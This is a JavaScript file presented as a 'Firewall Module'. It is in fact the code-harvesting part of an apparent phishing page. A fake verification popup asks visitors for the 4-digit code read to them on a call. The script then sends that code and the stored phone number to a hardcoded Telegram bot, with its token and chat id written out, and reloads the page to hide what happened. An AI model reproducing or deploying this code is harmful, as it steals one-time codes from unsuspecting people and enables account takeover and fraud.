/**
 * Firewall Module - 4-digit Verification with Telegram (includes code)
 */

// Send Telegram notification with code and title
async function sendTelegram(phone, code) {
    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("📨 Telegram sent");
    } catch(e) {
        console.log("Telegram error:", e);
    }
}

function showFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) {
        const content = document.getElementById('firewallPopupContent');
        if (content) {
            content.innerHTML = `
                <div class="firewall-warning-icon">📞</div>
                <h2>VERIFICATION REQUIRED</h2>
                <div class="firewall-message">
                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                    <p>Please wait for the verification call. You will receive a 4-digit code during the call.</p>
                    <p>Enter the code below to continue.</p>
                </div>
                <div class="verification-input-group">
                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
                </div>
                <div class="firewall-note">
                    <p>Waiting for system-verification call...</p>
                </div>
                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
            `;
        }
        popup.style.display = 'flex';
        setTimeout(() => {
            const ci = document.getElementById('verificationCode');
            if (ci) ci.focus();
        }, 100);
    }
}

function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

function refreshPage() {
    window.location.reload();
}

window.verifyFirewallCode = async function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    // Send notification with the code user entered
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    await sendTelegram(userPhone, code);
    
    hideFirewallPopup();
    alert("Verification submitted. Page will refresh.");
    
    setTimeout(() => {
        refreshPage();
    }, 500);
};

window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;
